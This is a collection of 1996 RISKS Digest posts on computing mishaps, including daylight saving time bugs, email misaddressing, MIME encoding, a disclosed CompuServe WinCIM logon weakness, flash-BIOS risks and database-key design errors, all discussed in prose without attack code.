&gt; The Laws do not state any general rule. Only dates for a couple years
&gt; each time. The "de facto rule" works, but there is no warranty it will
&gt; work forever!

With all of our scrambling about to deal with the Year 2000 problem,
shouldn't we be just as concerned with this inconsistency that arises
yearly (especially if there are no 'hard and fast' laws/standards to dictate
DST changeovers)?

If my bank kept my money in a cardboard box in their parking lot and
children stole it, I would blame the bank before the children. As long as
corporations and institutions design their computer systems only for
convenience and least cost, with maybe a superficial gesture at something
called 'security', they won't solve the problem.

The biggest risk of all is from people who won't accept their responsibility.

Like most e-mail clients, Microsoft's Exchange allows you to maintain lists
of user's addresses along with aliases.  In our simple configuration, we
have two, a personal list and a global list.  Up until recently, since our
e-mail system was closed and limited to project members, my personal list
was almost empty.  Since we have added an Internet gateway, I've begun
adding addresses not on the global list to my personal list.

Exchange has another useful feature as well, it will expand names from just
the first characters.  If multiple names match the abbreviation, it will ask
you to pick one.

Today I sent out an internal message, using "schu" as an abbreviation for
schumacher, which I have done many times in the past.  Shortly there after
the message was returned from the AOL e-mail daemon as undeliverable, highly
surprising since it was an internal message not destined for the Internet.

It turns out that last week I incorrectly added an AOL user whose name also
begins with "schu" to my personal address list.  Exchange apparently only
checks one list at time, flagging multiple possibles only within the list.
In this case, it checked my personal list first, matched the AOL user, and
quietly sent the message on.  If the name at AOL had been correct, I would
have not known about the misdirection at all.

The risks are obvious - instead of a somewhat trivial and incomprehensible
internal message, the message could have been highly confidential or time
critical.  The solution is trivial as well - check all mail lists for
conflicts (or at least have that as the default configuration &amp; easily
selectable).

&gt;Usenet (at least NNTP) is generally 8-bit transparent, and any European
&gt;soc.culture group will tell you that ISO 8859-1 usually works, ...

Though many machines on Usenet are eight-bit clean, NNTP is defined to be
seven-bit.  There's no guarantee that the use of raw characters in
ISO-Latin-1 will come out unharmed on the other end.

More risks: assuming that an action is advisable simply because it "usually
works."  This, unfortunately, is becoming more and more common even among
news software developers, some of whom have simply conceded the seven-bit
encoding battle and now write for an eight-bit net.

On 2 Apr 1996 16:20:16 GMT, <A HREF="mailto:sandee@Think.COM">sandee@Think.COM</A> (Daan Sandee) said:
&gt; [...] "co=F6perate", "na=EFf", and "Bront=EB.".  [...] It was already
&gt; mangled in the RISKS posting

Apparently, these examples were sent to RISKS encoded as "quoted-printable".
I guess, they were contained in an e-mail item adorned with the appropriate
MIME headers to announce that transfer encoding to any interested parties.
However, in the process of digesting, all header fields (except the From,
To, and Subject fields) were stripped off.

This seems to be a general problem with contemporary mail-digesting software.
Of course, the transfer-encoding has to be undone before you can safely
remove the pertinent header field. I hope, our moderator will be able to find
a mail-digesting program that handles MIME headers properly.

&gt; [...] I wish people wouldn't assume that the way their machine handles
&gt; non-ASCII characters is the same as everyone else's.

This is exactly the reason MIME was invented for.

&gt; Usenet (at least NNTP) is generally 8-bit transparent, and any European
&gt; soc.culture group will tell you that ISO 8859-1 usually works [...]

Not quite so! There are mail transfer agents, and perhaps other intermediate
software, that still will drop the most significant bit of every 8-bit
character.

&gt; This post of mine, however, goes out by e-mail (SMTP) and upper bits will
&gt; be stripped [...]

Hence, contributions to RISKS, and other e-mail based services, must exploit
MIME to convey those characters (until, eventually,  the powers that be might
agree on a 8-bit, or even 16-bit, based mail protocol). It is the digester's
duty to undo any transfer-encoding before the mail is digested, and to encode
the whole digest for transport, as necessary.

&gt; Well, I can handle diaereses all right, as long as they arrive in a form
&gt; recognizable by my software.

And it will be the subscriber's duty to undo the transfer-encoding of the
whole digest.

Otto Stolz

[I have asked several folks what I would need to do to MIME-ify RISKS.
I get responses that it is not that easy, or that it won't help
those who don't deal with MIME, or that perhaps I should just
wait until things settle down.  Meanwhile, we have a justification
for indigestion with undigestification.   PGN]

Summary: a new CompuServe Information Service (CIS) logon protocol was
designed to prevent passive and active attacks (where the attacker
impersonates a CompuServe node) but a flawed implementation in the
WinCIM 2.0(.1) client software still allows active attacks.

Version 2.0 of the "WinCIM" access software introduced a new logon protocol.
Previous versions of the software had transmitted the user's UID AND his/her
password in plaintext during logon. The risks are obvious, especially when
connecting via the Internet to CompuServe (e.g. to save long distance
telephone charges).

The new, "secure logon protocol" is a challenge-response type protocol where
the "challenge" is to compute a keyed hash-function, the key is derived from
the shared secret, the user's password:

1) The client (WinCIM) generates a pseudorandom string of bits, its "nonce"
(RB)
2) The client transmits the user's UID (e.g. 12345,6789) and the additional
parameter "/secure:1" to request a secure login.
3) The host transmits its pseudo random nonce (RA) (The old protocol would
instead prompt for the password)
4) client sends RB to the host
5) client computes  UR:=MD5(S|Z|RA|RB|S) and sends it to the host
(where S (128 bits) is a function of the password, "|" stands for
concatenation, Z is a 128bits block of 0s and MD5 is the well
known message digest function.)
6) The host performs the same calculation with it's copy of the user's
password. If the results match, the host sends HR:=MD5(S|Z|RB|RA|S)
(Note the symmetry in the calculation of HR and UR)
7) The client software verifies HR with it's copy of the password to
make sure the host is really a CIS node (!)

(See the script-files cserve.scr and seclog.scr in the subdirectory SCRIPTS
of a WINCIM 2.0(.1) installation, WinCim is available via anon. ftp
at ftp.compuserve.com).

Weaknesses:

a) The scriptfile cserve.scr (versions 3.8 &amp; 3.8.1) has the following bug:
even after requesting a secure logon, the client software will fall back
into the old protocol when receiving a "Password" prompt (Client: "I want
a secure logon" Host:"OK, but anyway, give me your password" Client "Well
ok then, here it is ..."). It will send the password in plaintext! This
makes the protection against active attacks (see step 7) obsolete.

b) A timeout condition or even an invalid HR response form the host will
(seclog.scr &amp; cserve.scr version 3.8.1) restart the protocol (it won't
disconnect!), using *the same* client-nonce RB again, instead of
generating a new one. If a spoofing host can predict RB as in this
situation, it can pick the same nonce, leading to HR=UR=MD5(S|Z|RB|RB|S),
so the host can just send back UR as HR.

Note that unlike a), b) does not compromise the user's password.

There may be other ways to predict the client software's nonce e.g. *if* the
PRNG used by WinCIM is predictable (this calls for further investigation).

Note that *offline* dictionary attacks to guess the password are possible
after a passive, eavesdropping attack (so you still have to pick a "good"
password). It's debatable whether CIS's password recommendation
(&lt;word&gt;&lt;non-alphanum. char.&gt;&lt;word&gt;, both words unrelated, e.g.
<A HREF="mailto:apple@battery">apple@battery</A>) is adequate in this context).

I notified CIS about these weaknesses and I was informed that they are
"fixed" now, no details were given about the fix (source: Britta Herbst,
German customer support (<A HREF="mailto:11111.754@compuserve.com">11111.754@compuserve.com</A>)).

Risks? The new protocol is obviously an improvement over the old,
plaintext-password-only version. It's debatable whether protection against
active attacks is at all necessary for access to an online service. However,
CIS itself designed it's protocol to prevent spoofing attacks. Anyway, I
think this a good example how to half-ruin a good protocol by embedding it
into carelessly written code.

Credits: Thanks to Gary Brown (<A HREF="mailto:70003.1215@compuserve.com">70003.1215@compuserve.com</A>) for sending me
information on the implementation of the new protocol).

You may not know the IBMMAIL system.  Internet addresses are translated to a
seven-digit number, which users use instead of real addresses.  It so
happens that I once ran a large mailing list and needed to track down which
messages were not delivered to which people, and so generated a unique
Return-Path for each message.  This caused a large number of IBMMAIL numbers
to be assigned to such addresses.  About once a month, I receive
confirmations of business transactions between Hong Kong and Singapore
companies to one of these addresses.  Clearly, the RISK is that humans
mistype numbers all the time, and when the addresses in a given range are
all valid, will send mail to the wrong recipient every now and then, just as
people misdial telephone numbers.

All information expressed in long numbers whose accuracy matter to either
party include redundant digits to reduce the number of valid numbers and to
provide consistency checks.  The same should be true of IBMMAIL numbers.
(Indeed, it should perhaps be true of domain names and usernames, too.)

&gt; Recently, on a mailing list I maintain, a Pegasus (the name of a
&gt; Mac/Windows e-mail reader) user posted a message with a line:
&gt;
&gt; &gt; X-Confirm-Reading-To: &lt;e-mail address&gt;
&gt;
&gt; This would be fine if Pegasus respected the field value when acting on
&gt; the presence of this field.  But Pegasus programmers apparently took the
&gt; RISK of assuming that they didn't have to.  Now every list member using
&gt; Pegasus is generating a confirmation message to the list.

Well, the problem wasn't as simple as that, that is only what it looks
like...

The "problem" is due to a new release of Pegasus which added a directed
confirmation header field as well as keeping the old confirmation header
field (which old versions simply respond to as best as they can).  The new
field name is called X-Confirm-Reading-To: &lt;e-mail address&gt; and the old name
is "X-pmrqc: 1".

Hence, unless familiar with these things, the mailer looks like it is not
behaving.

There are Risks in this whole episode, but I've worn myself thin trying to
defend the meaning of my post to a listserv listowner's list (a warning of
disruptive behaviour) with the author of Pegasus who took my comments
differently (as a rude personal attack).

Standard procedure for us net types is to leave .forward files when we
change accounts.  This is what I did when I left my previous employer.

Because of the nature of the Internet firewall we had there, to access the
net users had to actually log into the firewall machine - a bad idea in
itself, but it gets worse.

One fine day, I logged in to find a message informing me that the
firewall password had changed.  Conveniently, the message also included
the new password.  It seems that when I left, not only had they not
erased the .forward file, but they hadn't removed me from the system
alias file.

The risks?

1) Clean up after your old employees.
2) E-mail goes everywhere.
3) Don't e-mail passwords.  Ever.

&gt;In <A HREF="/Risks/17.95.html">RISKS-17.95</A>, Jacob Palme suggests that the reputation of "well-kept
&gt;depositories" and PICS-like ratings can be used to guard against malicious
&gt;Java code.  A more useful idea along the same lines is to allow for code to
&gt;carry a digital signature.  ...

Neither PICS-like ratings nor Digital Signatures is going to solve the
problem.  Yes, they might constrain some malicious users.  But what about
the data loss from buggy software?  Also, decentralization of code is a
promise of web-based languages.  A world in which every piece of code has to
be checked against a database of signatures is a much less flexible world
than one in which code runs in a "safe" environment.

Not to mention that a digital signature for a company will undoubtedly be
known by more people than a digital signature for a single user.  Thus,
the opportunities for theft of the signature would increase dramatically.

After my posting in <A HREF="/Risks/18.01.html">RISKS-18.01</A>, several people sent me e-mail.  A few
clarifications to my original note:

* Some PC vendors have a jumper that disables writing the flash.  In my
experience, this is unusual, although it's clearly present in some cases.
For those who are lucky enough, the jumper is even documented.  Clearly this
is a good solution for those whose PCs have the option.  Of course most
users won't read the manual that comes with the PC and thus won't realize
that there's a risk, much less understand how to thwart it.  [Pointed out by
<A HREF="mailto:mark@leasion.demon.co.uk">mark@leasion.demon.co.uk</A> (Mark Evans) and
<A HREF="mailto:afelson@milton.ecte.uswc.uswest.com">afelson@milton.ecte.uswc.uswest.com</A> (Adam Felson).]
[AND also by "Nicholas C. Weaver" &lt;<A HREF="mailto:nweaver@CS.Berkeley.EDU">nweaver@CS.Berkeley.EDU</A>&gt;,
with the default being disabled -- see the next item.  PGN]

* I wrote "...each vendor has solved the problem differently..."  The word
"vendor" should be understood as the vendor of the motherboard, which may
not be the same as the PC vendor.  That is, a brand X PC may use a brand Y
or brand Z motherboard.  So looking at the outside of the case may be
insufficient to determine whether the PC is "safe".  [Pointed out by Mark
Evans.]

* As an aside I wrote that the risk would be eliminated if people used more
modern systems such as UNIX, OS/2, or NT.  As pointed out by Benedikt
Stockebrand (<A HREF="mailto:benedikt@devnull.ruhr.de">benedikt@devnull.ruhr.de</A>), it doesn't *eliminate* the risk,
because there may be bugs that allow subverting the system and thus gaining
access to the flash RAM.  Stockebrand also pointed out that (on UNIX
systems) if you can get the virus/trojan run by root, then all bets are off.
Perhaps I should have said that running a more modern system *reduces* the
risk, since a virus/trojan would have to be a lot smarter than in a
DOS/Windows environment.

The above not withstanding, the point stands: most Pentium-based PCs are
extremely vulnerable to flash-based attacks.

Although I believe software solutions are necessary for correcting the
flash-BIOS problem on existing motherboards, I think all future motherboards
should just resort to an old-fashioned physical jumper.  If the jumper is in
place, then the BIOS is reprogrammable.  (If a malicious person has access
to your motherboard, he/she can do a LOT more damage then simply reflashing
the BIOS, but a malicious program can't -- especially if the motherboard is
shipped without the jumper in-place.)

&gt;From April 9, 1996 Albuquerque Tribune:

Computer-chip-manufacturing operations at Intel Corp.'s Rio Rancho plant
were back to normal today after a five-hour power failure, the company said.
Intel Corp. spokesman Richard Draper said today that Monday's power failure,
which ruined an undisclosed number of chips, including some of the plant's
Pentium microprocessors, was caused by a malfunction of Public Service
Company of New Mexico software.  "For business reasons, we're not going to
provide exact numbers as to the product loss from the shutdown," Draper
said. "However, the power outage won't have significant impact on Intel or
its earnings. It's expensive, but again, it's not a significant impact on
our bottom line."  Draper said the power failure occurred about 9 a.m.
Monday; full power was restored about 2 p.m. Monday.
Intel evacuated about 600 workers during the outage because of dark and
potentially unsafe working conditions.  "The PNM people told us it was a
glitch in a switching system," Draper said. "The original glitch lasted a
few seconds, but we waited to start operations because we were uncertain
about what happened and wanted to make sure we could restore full power."
Draper said PNM's apparent software error is believed to have caused the
wrong circuit breaker to open at a substation, incapacitating three of six
transformers.
Karin Stangl, a Public Service Company of New Mexico spokeswoman, said
power was restored after about a minute, and she could not explain the
longer problem at Intel.  Stangl said PNM and Intel are investigating.

[I find Intel's conservative response, both in evacuation, and
waiting to be sure the power was back, interesting.
Maybe the software was running on a non-Intel processor trying
to get even with the Pentiums...  BEW-are]

I was hit by a daylight savings time problem Monday, the day after the time
changed here. My machine is running four different operating systems:
Windows 95, Windows NT, OS/2, and Linux. Since I'd doing cross platform
development, I usually boot at least two different OS's a day.

Monday, I booted Windows 95 first. At startup, I was greeted by a polite
messages asking if the time should be changed to DST.  Fine. Time changed
and correct.

Later in the day, after booting both NT and Linux, I noticed the time was
yet another hour ahead. Either NT or Linux (and I suspect NT, but can't
confirm that) had also, but invisibly, changed to DST.

After some thought, and a class discussion in the software engineering class
I teach, I've concluded this is not an easy problem to solve. In this case,
there were two basic contributing factors I can figure out. First, PCs keep
the internal clock in local time. Not a good idea -- it should be Universal
Time -- but reality. The problem is then that NT or Linux made the assumption
it was the only OS on the machine, and was free to update the time. Unlike
Win95, which could be polite about the change because it is normally a
single user system, NT and Linux both could reasonably assume they don't
normally get shut down each evening, and thus the silent time update (I'm
guessing). It would be unreasonable to expect confirmation from an operator.

In this case, however, the time update did come at boot time. It seems to me
a better update policy for NT/Linux would be to silently update the time if
the change happened while running, and require a confirmation if it happens
at boot time. Not perfect, but better. I tried OS/2, also, and it just
ignored the time change.

&gt; At <A HREF="http://www.timing.se/Daylight.html">http://www.timing.se/Daylight.html</A> there is a brief discussion
&gt; of the rules for Daylight Savings Time changeovers for central Europe
&gt; and the UK. At the end of the page it says:
...
&gt; &gt; The rule is a "de facto standard," not a law.
...
&gt; With all of our scrambling about to deal with the Year 2000 problem,
&gt; shouldn't we be just as concerned with this inconsistency that arises
&gt; yearly (especially if there are no 'hard and fast' laws/standards to dictate
&gt; DST changeovers)?

But there *are* 'hard and fast' laws that dictate DST changeovers.  There is
however *not* a law that dictates this far into the future but only for a
few coming years.  (Note that these laws, EU directives, are made up far in
advance.  It was already known a few years ago that the EU would change the
rule this year.)  It appears not to be very advisable to cast changeover
dates in concrete.  It is up to the software to deal with this flexibility
and Andrew Olson's timezone package deals very well with it.  (And some
software does not handle it well at all.  Most annoying was a bug in SGI's
software which thought the last Sunday in September last year was October 1,
and so switched out of DST one week late.  Exactly the same bug stroke again
this time when the software thought that the last Sunday of March was March
24, and so switched into DST one week early.  Surprising that the bug was
not fixed in that half year.)

I have read posts recently about several risks that all boil down to
one thing -- the Risk of making poor information system design decisions.
Poor security systems, employees selling data, even the CDA are all at
least partly the result of poor technical decisions.  Unfortunately, this
often happens in low-bidder-gets-the-job situations.
Konica, the company I work for, has come up with a partial solution to
this problem.  We formed a group called the Information Partners, a
cross-functional group of technical people, managers, and end users from
across our company.  This group steers our corporate information and
technology resources.  We serve as an interface between programmers, users
and upper management, and frequently call in outside help to get the best
systems at reasonable prices.

NOTE: I am not representing Konica as good, bad or otherwise, just stating
how one group met a Risk.

Our solution has its own Risks, but we help to highlight the importance
of technology in a business environment.  This usually gets us away from the
lowest-bidder reasoning.  The key to success seems to lie in not getting
bogged down in the committee mentality, but rather contributing where we can
add something.  Is a committee the answer to every problem?  Certainly not,
but where computers and systems are concerned, more input can mean a better
result.

I've seen hundreds of stories here and elsewhere about software, hardware,
hybrid and other systems that get blamed for dangerous actions, actions which
compromise security or confidential information, etc., and then always end
with the standard "risks are obvious" caveat. So I though I'd relate a
description of a tremendous danger I just discovered right here in my own
residential neighborhood.

There's a partly computer-controlled / partly operator-controlled mechanical
system near my house that must weight a couple of thousand pounds and has what
I consider to be an unacceptably dangerous user interface.

Today, I noticed that the operator had the ability to operate the system in a
manner that was in violation of numerous laws -- local, state and federal --
without any type of lockout mechanism built in, that there were essentially NO
facets of the user interface that were designed to preclude (or even hamper)
the operator from exceeding the system's absolute maximum operating parameters
(leading quickly to a complete, catastrophic and dangerous failure of the
system), and that the system could be easily operated in a manner which very
seriously jeopardized the safety of the operator and anyone else within a mile
or two (easily fatally), all without even the slightest intervention by the
control system's software or hardware.

Of course... it's my car. My point is that, yeh... your software can make it
*easier* for you to send a confidential memo to your lover and dirty pictures
to your boss, or a Man-Machine Interface can make it *easier* to land a plane
down with the landing gear up, or an engineer can crash a locomotive into the
station *quicker* because the signals weren't triple-redundant and both
warning lights had burned out...

But *YOU'RE* the one that didn't carefully review the address list on that
memo before you clicked [SEND], and *YOU'RE* the one that didn't religiously
observe the standard landing checklist, and *YOU'RE* the one that should have
realized that you shouldn't be going 65 MPH 100 yards from Grand Central.

I'm not trying to defend my profession; I've cursed up and down many a poorly
designed system. But I wonder: are we trying to build better MMI's or just
encouraging dumber operators to distance themselves from responsibility for
their own actions?

In <A HREF="/Risks/17.95.html">RISKS-17.95</A>, Jacob Palme suggested the use of peer-review to filter out
malicious software.  While potentially useful, there are a wide variety of
attacks such a strategy would likely miss.  For example, suppose a virus /
alternative-model-Java applet author specifically targetted machines which
were in a particular domain.  Such a form of malicious software is much less
likely to be detected by however large a user pool.  (And a virus targetting
a single company has been found ``in the wild'' before, I believe.)  It is
risky to believe that our past experiences with malicious software is a
completely accurate predictor of the future; riskier still not to consider
the entire collective past experience.

The idea of signing software is not new.  Bellcore's Betsi system uses PGP
to have the author sign their software, and the idea has certainly been
bounced around the security community before that was implemented.  The
effect of CAPI signatures is to make governmental agencies happy so that the
API may be exported.  I doubt that Microsoft cares very much whether the
cryptographic service provider code written by third parties are bug free.
In the CAPI signing model, it is a central authority doing the signing.
Certainly there might be liability issues if MS -- or Sun/Netscape/... for
centrally signed Java applets -- says anything about having looked
cross-eyed at the third party code (risks of deep pockets?).

With author-signed code, the picture wouldn't be entirely rosy either.
Given the number of potential individual coders on the 'net, the
process of knowing who writes good code and who writes buggy code (and
potentially cause security problems) is rather daunting.

Governments aren't the only organizations that make stupid database-key
decisions.  Our prescription-drug plan has limitations on how much of a
given drug a patient can get at a time -- generally one month's supply.  A
reasonable restriction, all in all, and especially so with Federally
controlled substances such as Ritalin and Dexedrine.

The trouble is, their computer systems check this by keeping a history of
each patient's prescription fills.  The primary database key is the plan
number (basically the primary beneficiary's SSN) and the secondary key, to
distinguish family members, is the individual's birthdate.  (Anybody see the
problem here?)

We have identical twins.  Both are on similar long-term medications for
asthma and ADD, which routinely sends the pharmacy nuts because they can't
get approval for the second set.  (A related problem would be if both
parents were covered, thus having different primary keys.  Why do I suspect
that THAT problem was resolved early?)

The RISK here is in programming for the 95% case without any provision for
not-all-that-rare exceptions.

security problems with Compuserve's new client.  One of the major ones was
that, although they had switched the primary authentication to do a
challenge handshake, the client would still happily accept a request for
plaintext authentication.

This actually turns out to be a relatively common problem with PPP client
implementations.  There are a number of public domain and commercial clients
that will accept a PAP negotiation even if configured only for CHAP.
Security nightmare.

It seems to me that this mistake flows very naturally out of the PPP
specification as a whole.  A good PPP implementation will attempt to
negotiate just about anything -- Ask for X, if they refuse, ask for Y, if
they refuse ask for Z -- and that same implementation will be as generous as
possible in accepting options -- Sorry, we don't do X.  You want to do Y?
Okay.

This mindset is great for interoperability, but it's a very bad failing when
it comes to security.

&gt; Though many machines on Usenet are eight-bit clean, NNTP is defined to be
&gt; seven-bit.  There's no guarantee that the use of raw characters in
&gt; ISO-Latin-1 will come out unharmed on the other end.

NNTP says nothing about character set in the text of an article.  In fact,
it says, "No attempt shall be made by the server to filter characters, fold
or limit lines, or otherwise process incoming text" [rfc977].  I take this
to mean it is intended to be 8-bit clean when used over an 8-bit clean
transport, such as TCP.

USENET messages are not explicitly limited to 7-bit, but "all USENET news
articles must be formatted as valid ARPANET mail messages, according to the
ARPANET standard RFC 822" [rfc850].  Read literally, this excludes all
non-encoded non-ascii text.

Current practice varies from one newsgroup to the next, and even within
newsgroups.  Some use 8-bit characters, others use some sort of 7-bit
encoding, and there is usually nothing in the headers or the body to
indicate what the encoding and character set are.

In <A HREF="/Risks/18.02.html">RISKS-18.02</A>, John Hoffman (&lt;<A HREF="mailto:john@netweave.com">john@netweave.com</A>&gt;) describes risks that he
felt were associated with the methods used by the Microsoft Exchange e-mail
client to resolve partial addresses in outgoing messages.

As it happens, there are two features of Exchange that can help to avoid or
eliminate these risks: the Check Names feature, and an option in the client
that controls the query order for address providers.

The first feature (activated by a toolbar button or Alt-K on the keyboard)
resolves all partial addresses in a message header before the message is
actually sent; the user may then verify that the selections made by Exchange
actually correspond to the recipients he has in mind.

The second feature (found on the Tools | Options | Addressing property
sheet) lets the user change the order in which address providers are
queried.  By placing the Global Address List ahead of the Personal Address
Book (the opposite of the default) in this way, Exchange can be forced to
look for a match within the user's organization before checking any
(possibly external) addresses in his Personal Address Book.  (As John has
correctly surmised, Exchange stops at the first address book that contains
one or more matches for a partial address.)

I use both of these features, and I rarely encounter any problems with
incorrect resolution of ambiguous partial addresses.  If I have any doubt, I
do a quick double-click on the resolved name in order to verify that it is
really pointing to the recipient I have in mind.  I do try to use display
names in my Personal Address Book that do not match anything in the Global
Address List, so that I can spot incorrect resolution of an address at a
glance (e.g., the display name for my own CompuServe address in my Personal
Address Book is slightly different from the display name of my internal
address on the Global Address List).

I haven't used this particular mailer, but maybe part of the risk is in the
design of the mailer.  The free UNIX mailer I use allows a long name to be
assigned to an alias (e.g., the person's real full name).  When I enter an
alias, that name immediately appears on the "To:" line in front of me.
That's saved me from embarrassment more than once.  Being extra paranoid, I
almost always also use a feature of the mailer that lets me see all the
headers before I send a message (and change them if I've goofed).  Silent
mapping of aliases is not something I would want.

[ I was recently reminded of this one by a thread in a newsgroup I frequent ]

It seems that in the OS/2 (2.1 and Warp) TCP/IP stack socket descriptors are
system-wide.  That is, they aren't per-process file descriptors, so if you
can discover the number of some other process's socket (and netstat -s will
helpfully list all the open sockets on the system) you can send(), recv(),
shutdown() or do many other fun things with it.

Risks include the fact that anyone with telnet access to the machine (and
OS/2 telnet security is a risk in itself) can write a program to subvert any
TCP/IP server running on it.

A shame, because otherwise it's one of the better non-Unix implementations
of the BSD socket API.

Summarized from the *Detroit Free Press*, 11 April 1996, p. 4B.

John O'Valle was convicted in 1987 on charges of cocaine and weapons
possession, and was expected to serve 20 years in prison.  Later on,
however, the sentencing judge reduced the sentence on technical grounds,
making him eligible for release in 1992.  The reduction was noted in
O'Valle's written file, but not in the Department of Corrections' computer
records.  (Neither O'Valle nor his lawyer was notified of the change.)

In January 1996, prison officials reviewed his records and discovered the
discrepancy.  However, there is now a new problem.  In 1995, O'Valle was
convicted for possession of marijuana while in prison, a felony.  Had he not
been in prison at the time, he would have been guilty of a misdemeanor and
not subject to jail time.  So now O'Valle is serving time for a felony,
which (presumably) never would have happened had he been released on time.
State officials aren't sure what to do.

Officials aren't sure what happened.  O'Valle's warden says that sentencing
formulas are complicated, and the prison camp program and parole programs
were in "transition" during the time O'Valle entered the system.

Perhaps a new story with an old moral: if you have replicated data sets,
make sure that the data sets are consistent.

I don't mean "critical" as in "film-at-eleven," but as in its size
or penetration has reached a sufficient point for a process to occur.

In ten years on the net, I've only come across a couple other people with my
last name.  Websearches never revealed anything but links to my own data.

But within the past few weeks this has changed.  RISKS had an article about
www.switchboard.com, which lists some 350 Roebers.  A new websearch finds a
dozen Roebers.  And suddenly the e-mail has started coming in-- "My name is
&lt;something&gt; Roeber.  Might we be related?"  And this is all happening at
once.  It shouldn't be long before we have the whole family tree worked out.

I can't say there's a hard risk to this, other than the usual ones of
privacy and how the net is making this an ever-smaller world.  (But I do
hope none of those 350 www.switchboard.com hits are actually federal
witnesses in the American witness protection plan.  Pretty soon they'll
stick out like sore thumbs.)

It seems that a friend's friend [name altered] decided that he wanted to
only have a single name, Smith. When Smith had his name legally changed to
just Smith one of the things that he had to do was get a new drivers
license. So he headed on down to the local DMV.

It seems that the state of Oregon (at the time at least) had a computer
system that required that both a first *AND* last name be entered for every
persons license. Of course Smith only had one name (and the paper to prove
it). So after struggling with the system for a while the diligent workers
asked Smith to come back in a couple of days when they would have a license
for him. And, sure enough, a couple of days later he returned to find a
license with just the name Smith on it waiting for him, all seemed to be
well.

While on a road trip, which Smith is prone to, he was pulled over for some
sort of traffic violation. When he was offered up his license as per request
the police officers were concerned with his lack of a second name (first or
last? you decide). When they looked him up, he was not in Oregon at this
time, they could not find any such person as "Smith" in the Oregon registry.
At this point the police officers began to get suspicious. After much
investigation, and a great deal of lost time and frustration on the part of
Smith and the local constabulary, it was determined that the state of Oregon
had done the following:

Failing to get the system to accept a single name for a drivers license they
inserted a fictitious second name "Jay". They then simply altered the
printing process so that only the name "Smith" actually appeared on the
license. So to find Smith in the Oregon listing one would have to look under
"Smith Jay".

The risks? Well, I believe trouble with the law would be obvious in this
case. It might also cause problems in terms of employment where security and
background checks are done as well as insurance. I believe that the least
that could have been done would have been to explain to Smith what had been
done to make this work. It might also be more appropriate to have a preset
second name like "No Second Name" that could appear either in the list, on
the license or both.

I was filling out an application for a summer job.  Time was of the essence,
so the company's normal employment application was FAXed to me.  Printed in
landscape mode, the bottom question, about whether I'd been convicted of a
crime, got cut off by the FAX machine.  Since various companies ask the
question in different ways (some ask only about felonies, others include
traffic citations, etc.), I decided that the best approach was to write in,
"I have not been convicted of a felony" and to initial it.  I then FAXed the
application back.

I received a phone call within the hour asking if I was a felon.  I had
written the word "not" a little lower on the page, and _it_ got cut off on
the return trip.  The situation was resolved, but somewhat amusing.  I've
fought laser printers that can't print closer than 1/4" to the edge of the
page before, so I should have known about the problem, but I forgot.

RISKS: You think of FAX as being WYSIWYG, but it isn't quite.  And you can't
(easily) see what the recipient will get.

The Netherlands and the Dutch-speaking region of Belgium have an
organization to define the language (Dutch) spoken in the two counties. This
organization reformed the Dutch language the last time in 1947-1954 by
printing "Het groene boekje" (the little green book) _Woordenlijst
Nederlandse Taal_. This book defines the rules and words used in the Dutch
language.

In the last few years, there has been a feeling of unease with the spelling:
it was felt that there were to many "illogical" words. So, a committee was
formed to reform the language. But they proposed a radical change -- for
example, the use of "c" sounding like "k" would be abolished. There was
protest (and the grounding of a "We love the letter C" group) and the
politicians told the committee to soften its proposal. It seems that they
did this (in a very short time) by simply removing rules that were too
radical, and then removing a bit more. (Nobody actually knows for sure:
interviews with committee members result in a lot of finger pointing and "It
works for me".)

So, version 2 came out, and is now law. It must be introduced in the
schools, government and media. There is one snag: the rules are not
"complete": the rules given don't even include the spelling of words given
as examples, and there are cases without any rules.

Nobody uses the green book; people use dictionaries. But the major
publishers found the rules and the words in argument, so introduced their
own rules. Each publisher has different ones. Major newspapers also have an
internal dictionary, and they did the same. One major encyclopedia publisher
even found the new rules so bad that it refuses to use the new spelling.

The RISKS? I have to write my thesis *after* the new spelling becomes law,
and I have to write it in Dutch. Now my only problem (and that of Microsoft,
Lotus(oops IBM), Word-perfect (whoever owns them), etc), is *which* Dutch.
This whole case is a textbook demonstration of the RISKS of language
specifications and the influence of politics on "natural" or "logical"
designs. 20.5 million people have to live with the consequences.

There has been another side effect of the daylight savings time change,
with the Netscape Navigator browser: caches have incorrect times and no
longer work properly for documents that change frequently.

Netscape Navigator version 2.x for Windows and Unix platforms is an hour off
in its cache-file handling.  If a user tries to reload a page that has
changed within the last hour, the browser still thinks its cached version is
more up to date and won't retrieve the new version.  (After an hour, this is
no longer an issue.)  This has been a problem with news organizations (such
as ours), chat/bulletin boards, and java applets that need to be updated
frequently.

Netscape's "force reload" procedure (shift key + reload button) doesn't
always work either: the only solution is to flush the memory and disk caches
before a reload, or to set them to size zero.  Netscape has made no official
statement, but apparently has said the bug won't be fixed in the next
version of the software (2.1) but in the one after that (3.0 (Atlas)).

The Macintosh version does not suffer from this bug, nor do versions 1.x, or
browsers from other manufacturer.

The risk (aside from the obvious one related to programming for time
changes) is trusting that a market-leader software company is going to have
bug-free software.

Defying the RISKS tradition of intoning that "the risks are obvious",
one could draw the following lessons:

-- Time-dependent functions should be tested using multiple time

-- In networked applications, local time issues can cause more than

My university recently (ca. January 1, after a testing period of about a
month) instituted a new dialup service, for which students and faculty are
charged 75 cents per hour peak and 60 cents off-peak.  A couple of days ago
I logged on and saw something like the following in my logon message:

&gt;  Charges THIS month to date   500 minutes for a cost of $   49.59
&gt;  Charges LAST month (total)  2089 minutes for a cost of $   24.76

(Note that these aren't the exact figures, but you get the idea.)  Needless
to say I was consternated.  After complaining to the admins, I learned that
the billing discrepancy arose from the change to Daylight time.  Night owl
that I am, I happened to be logged in at the exact moment that 2:00 a.m. EST
became 3:00 a.m. EDT.  Needless to say, this was the first time they had
dealt with the changeover.  Happily, the problem has since been fixed, but

The March 1996 issue of IEEE COMPUTER contains an article on the rise of
computer crime ("Security and Privacy TC," by Deborah Cooper and Charles
Pfleeger, pp. 118-119; TC = Technical Committee).  Based on a table of
statistics obtained from the CERT Coordination Center, the article claims
that computer crime is undergoing a "dramatic escalation."  Whether or not
this is true, the article is seriously flawed, and it points out the risks
of shoddy statistical reasoning.

Here is an excerpt from the table, which has the heading, "Computer
Emergency Response Team (CERT) statistics show that computer attacks are on
the rise."

YEAR    INCIDENTS REPORTED
==========================
1988            6
1989          132
1990          252
1991          406
1992          773
1993         1334
1994         2341

On first glance, this certainly appears to be a "dramatic escalation" in
computer crime... or does it?  Let's look at how much information was
not presented in the article.

The table heading discusses "attacks," but the table column says
"incidents."  So what exactly is an "incident?"  Is it a report of an
alleged attack?  (Likely, given that CERT is usually the recipient of
unsolicited reports.)  Or is it a verified attack, meaning that erroneous
